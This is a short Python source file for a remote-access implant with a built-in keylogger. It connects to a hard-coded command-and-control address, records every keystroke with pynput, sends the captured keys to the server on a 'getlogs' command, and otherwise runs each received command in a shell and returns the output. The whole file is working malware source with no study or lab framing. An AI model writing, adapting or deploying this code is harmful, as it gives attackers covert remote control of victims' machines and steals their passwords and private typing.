import csv
import socket
import subprocess
import threading

from pynput import keyboard


class Agent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.recorded_keys = ""
        self.keylogger_active = True

    def start_keylogger(self):
        def on_press(key):
            try:
                self.recorded_keys += key.char
            except AttributeError:
                self.recorded_keys += f"[{key.name}]"

        listener = keyboard.Listener(on_press=on_press)
        listener.start()

    def connect_to_c2(self):
        s = socket.socket()

        try:
            s.connect((self.server_host, self.server_port))
            self.start_keylogger()  # start keylogger after connection

            while True:
                command = s.recv(1024).decode()
                if command.lower() in ["exit", "quit"]:
                    break

                if command == "getlogs":
                    s.send(self.recorded_keys.encode())
                    with open("keylogs.csv", "w") as f:
                        f.write(self.recorded_keys)
                    self.recorded_keys = ""
                    continue

                output = subprocess.getoutput(command)
                if output == "" or output == " ":
                    output = "[+] Command executed (no output)"
                s.send(output.encode())
        except Exception:
            pass
        finally:
            s.close()


if __name__ == "__main__":
    server_host = "192.168.178.82"
    server_port = 9999
    agent = Agent(server_host, server_port)
    agent.connect_to_c2()
